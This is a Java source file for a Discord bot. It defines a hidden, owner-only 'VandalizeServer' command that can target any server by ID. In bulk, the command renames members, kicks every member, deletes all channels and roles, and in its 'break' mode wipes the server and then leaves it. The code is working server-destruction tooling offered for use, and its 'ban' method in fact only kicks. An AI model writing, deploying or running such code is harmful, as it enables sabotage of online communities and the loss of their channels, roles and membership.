package com.safjnest.Commands.Owner;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import com.safjnest.Utilities.CommandsLoader;
import com.safjnest.Utilities.SafJNest;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.exceptions.ErrorHandler;
import net.dv8tion.jda.api.requests.ErrorResponse;

/**
 * @author <a href="https://github.com/Leon412">Leon412</a>
 * 
 * @since 1.1
 */
public class VandalizeServer extends Command {
    Guild guild;
    Member self;

    public VandalizeServer(){
        this.name = this.getClass().getSimpleName();
        this.aliases = new CommandsLoader().getArray(this.name, "alias");
        this.help = new CommandsLoader().getString(this.name, "help");
        this.cooldown = new CommandsLoader().getCooldown(this.name);
        this.category = new Category(new CommandsLoader().getString(this.name, "category"));
        this.arguments = new CommandsLoader().getString(this.name, "arguments");
        this.ownerCommand = true;
        this.hidden = true;
    }

    public void setSuffix(String suffix) {
        guild.getMembers().forEach(member -> {
            String username = (member.getNickname() == null) ? member.getUser().getName() : member.getNickname();
            if(self.canInteract(member) && !username.toLowerCase().endsWith(suffix.toLowerCase())){
                member.modifyNickname(username + suffix).queue(
                    (e) -> System.out.println(username + " - ok"), 
                new ErrorHandler().handle(ErrorResponse.MISSING_PERMISSIONS,
                    (e) -> System.out.println(username + " - no"))
                );
            }
        });
    }

    public void delSuffix(String suffix) {
        guild.getMembers().forEach(member -> {
            String username = (member.getNickname() == null) ? member.getUser().getName() : member.getNickname();
            if(self.canInteract(member) && username.toLowerCase().endsWith(suffix.toLowerCase())){
                member.modifyNickname(username.substring(0, username.length() - suffix.length())).queue(
                    (e) -> System.out.println(username + " - ok"), 
                new ErrorHandler().handle(ErrorResponse.MISSING_PERMISSIONS,
                    (e) -> System.out.println(username + " - no"))
                );
            }
        });
    }

    public void kickMembers() {
        guild.getMembers().forEach(member -> {
            String username = (member.getNickname() == null) ? member.getUser().getName() : member.getNickname();
            if(self.canInteract(member)){
                member.kick().queue(
                    (e) -> System.out.println(username + " - ok"), 
                new ErrorHandler().handle(ErrorResponse.MISSING_PERMISSIONS,
                    (e) -> System.out.println(username + " - no"))
                );
            }
        });
    }

    public void banMembers(String reason) {
        guild.getMembers().forEach(member -> {
            String username = (member.getNickname() == null) ? member.getUser().getName() : member.getNickname();
            if(self.canInteract(member)){
                member.kick().queue(
                    (e) -> System.out.println(username + " - ok"), 
                new ErrorHandler().handle(ErrorResponse.MISSING_PERMISSIONS,
                    (e) -> System.out.println(username + " - no"))
                );
            }
        });
    }

    public void delChannels() {
        guild.getChannels().forEach(channel -> {
            channel.delete().queue(
                (e) -> System.out.println(channel.getName() + " - ok"), 
            new ErrorHandler().handle(ErrorResponse.MISSING_PERMISSIONS,
                (e) -> System.out.println(channel.getName() + " - no"))
            );
        });
    }

    public void delRoles() {
        guild.getRoles().forEach(role -> {
            if(self.canInteract(role)){
                role.delete().queue(
                    (e) -> System.out.println(role.getName() + " - ok"),
                new ErrorHandler().handle(ErrorResponse.MISSING_PERMISSIONS,
                    (e) -> System.out.println(role.getName() + " - no"))
                );
            }
        });
    }

    @Override
    protected void execute(CommandEvent event) {
        String[] args = event.getArgs().split(" ", 3);
        String command, options;
        if(SafJNest.longIsParsable(args[0]) && event.getJDA().getGuildById(args[0]) != null) {
            guild = event.getJDA().getGuildById(args[0]);
            command = (args.length > 1) ? args[1] : "";
            options = (args.length > 2) ? args[2] : null;
        }
        else {
            guild = event.getGuild();
            command = (args.length > 0) ? args[0] : "";
            options = (args.length > 1) ? args[1] : null;
        }
        self = guild.getMember(event.getSelfUser());

        switch (command) {
            case "suffix":
                if(options == null) {
                    event.reply("You have to write the suffix");
                    return;
                }
                setSuffix(options);
                System.out.println("Suffix queued");
                break;

            case "desuffix":
                if(options == null) {
                    event.reply("You have to write the suffix");
                    return;
                }
                delSuffix(options);
                System.out.println("Desuffix queued");
                break;

            case "kick":
                kickMembers();
                System.out.println("Members kick queued");
                break;

            case "ban":
                banMembers(options);
                System.out.println("Members ban queued");
                break;

            case "channel":
                delChannels();
                System.out.println("Channels delete queued");
                break;

            case "role":
                delRoles();
                System.out.println("Roles delete queued");
                break;

            case "break":
                delChannels();
                System.out.println("Channels delete queued");
                        
                banMembers(options);
                System.out.println("Members ban queued");

                delRoles();
                System.out.println("Roles delete queued");

                guild.leave().queue();
                System.out.println("Escape queued\nAll queued");
                break;

            case "escape":
                guild.leave().queue();
                System.out.println("Escape queued");
                break;
        
            default:
                event.reply("Something went wrong (command or server not found)");
                break;
        }
    }
}